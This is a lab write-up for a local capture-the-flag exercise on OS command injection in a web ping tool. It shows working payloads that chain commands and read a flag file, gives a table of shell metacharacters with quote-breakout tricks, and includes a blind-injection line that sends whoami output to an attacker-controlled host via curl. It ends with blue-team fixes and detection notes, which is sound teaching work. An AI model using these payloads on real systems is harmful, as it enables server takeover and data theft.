# Day 7 — Command Injection

**Lab:** Command Injection (`day07-injection`)
**Date:** 2026-10-12
**Environment:** Kali + Firefox, target `http://localhost:5000/tools/ping` — "Network Diagnostic Tool"
**Flag:** `CODED{cmd_1nj3ct10n}`

---

## Objective

Exploit an OS command injection vulnerability in a web-based network diagnostic tool to run arbitrary commands on the server and read a hidden flag.

## Setup

```bash
cd ~/Desktop/Foundation\ Labs/day07-injection
./start.sh
# Web App:    http://localhost:5000
# Log Server: http://localhost:5001
```

---

## What the app does

The page offers a **Ping a Host** box. You type a hostname, it runs `ping` against it and shows the raw output:

```
Input:  google.com
Output: PING google.com (142.250.203.174) 56(84) bytes of data.
        64 bytes from 142.250.203.174: icmp_seq=1 ttl=127 time=29.8 ms
        2 packets transmitted, 2 received, 0% packet loss
```

The problem: the server builds a shell command by **concatenating your input into a string** and handing it to the operating system's shell — something like:

```python
os.system("ping -c 2 " + user_input)     # VULNERABLE
```

The shell doesn't see "a hostname" — it sees a full command line. Shell **metacharacters** in your input are interpreted as instructions, not data. That's command injection: making the server run *your* OS commands.

---

## The exploit chain

### 1. Confirm injection — chain a second command with `;`

```
google.com;whoami
```

Output:
```
...google.com ping statistics...
rtt min/avg/max/mdev = 25.759/28.215/30.672/2.456 ms
root
```

The `;` ended the `ping` command and started a new one (`whoami`). The server ran it and returned **`root`** — so it's injectable *and* the web app runs as **root**. Full server compromise.

### 2. Locate the flag — pipe output into a filter

```
|ls /etc| grep "flag"
```

Output:
```
flag.txt
```

The leading `|` **pipes** ping's output into `ls /etc`, and the result is filtered by `grep "flag"`, revealing `/etc/flag.txt`.

### 3. Read the flag

```
| cat /etc/flag.txt
```

Output:
```
CODED{cmd_1nj3ct10n}
```

Confirmed by the lab's build log:
```
[7/7] RUN echo "CODED{cmd_1nj3ct10n}" > /etc/flag.txt
```

### Flag

```
CODED{cmd_1nj3ct10n}
```

---

## Study notes — the shell metacharacters (when each one works)

Command injection works by smuggling shell **operators** into a field the server passes to a shell. Which operator to use depends on how your input is placed in the command:

| Operator | Name | What it does | When you'd use it |
|----------|------|--------------|-------------------|
| `;` | Semicolon | Run command B after A, **regardless** of whether A succeeded | The all-purpose separator when your input lands at the *end* of the command, unquoted |
| `&&` | AND | Run B **only if A succeeds** (exit code 0) | When you need A to complete first |
| `\|\|` | OR | Run B **only if A fails** | When you can make A fail (e.g. an invalid host) so B runs |
| `\|` | Pipe | Feed A's **output** as B's **input** | Filtering/processing output — `... \| grep`, `... \| base64` |
| `` `cmd` `` | Backticks | **Command substitution** — run `cmd`, insert its output | Works even when your input is wrapped **inside quotes** |
| `$(cmd)` | Dollar-paren | Modern command substitution (same idea, nestable) | Same as backticks; survives inside `"double quotes"` |
| `&` | Background | Run A in the background, return immediately | Fire-and-forget / blind injection |
| `%0a` (`\n`) | Newline | URL-encoded newline = a fresh command line | When `;` is filtered but newlines slip through (esp. in URLs) |

### The key idea — quoting context decides which operator works

- Server builds `ping -c 2 <input>` with your input **unquoted** at the end → `;`, `&&`, `||`, `|`, `&` all work, because the shell parses them as operators. → *This lab.*
- Server wraps input in **double quotes** — `ping -c 2 "<input>"` → plain `;` is a literal character and does nothing. First **break out of the quotes** (`"; whoami; "`) or use command substitution `$(whoami)` / `` `whoami` ``, which the shell still evaluates *inside* double quotes.
- Server uses **single quotes** — `ping '<input>'` → even `$()` is inert; you must break out with a `'` first: `'; whoami; '`.

This is the same "break out of the surrounding context, then inject" idea as SQL injection — there you escape a string literal in a query; here you escape a string in a shell command.

### In-band vs blind

- **In-band** (this lab): the command's output is shown back on the page, so you read results directly.
- **Blind**: output isn't returned. Confirm injection by *side effects* — a time delay (`; sleep 10` → page hangs 10s), or make the server call out to you (`; curl http://my-server/$(whoami)`) and read your own logs/DNS.

### How it compares to the other injection bugs (Day 6)

| Vuln | Attacker input is interpreted as… | Runs where | "Breaking out of"… |
|------|-----------------------------------|------------|--------------------|
| **SQL injection** | SQL query code | the database | a string in a SQL query |
| **XSS** | HTML/JavaScript | the victim's browser | HTML output context |
| **Command injection** | OS shell commands | the server's operating system | a string in a shell command |

All one root cause: **untrusted input concatenated into an interpreter** (SQL engine, browser, or OS shell). Command injection is often the most severe — it's direct code execution on the server, and here it handed over a root shell.

---

## Blue-team reflection

- **Root cause:** user input concatenated into a shell command. **Fix:** don't invoke a shell at all — use a language API that takes an **argument list**, not a string, so input can never be parsed as an operator. In Python: `subprocess.run(["ping", "-c", "2", host])` (a list, **no** `shell=True`). The OS then treats `host` as a single argument, so `;whoami` becomes a literal (invalid) hostname, not a command.
- **Defense in depth:** reject anything containing shell metacharacters); run the service as an **unprivileged user**, never root, so even a successful injection can't read `/etc/flag.txt` or worse.
- **Detection:** a diagnostic tool spawning child processes like `whoami`, `cat`, `sh`, or `curl` is highly abnormal — the same "web process spawns a shell" signal from the Day 3 Linux lab. Alert on unexpected child processes of the web app and on outbound connections from it.

**Takeaway:** anywhere a web app shells out to a system command (ping, nslookup, image conversion, PDF generation, git operations) and lets user input near that command, test for injection with `;`, `|`, and `$()` — and match the operator to how your input is quoted in the underlying command.

## Cleanup

```bash
./stop.sh
```
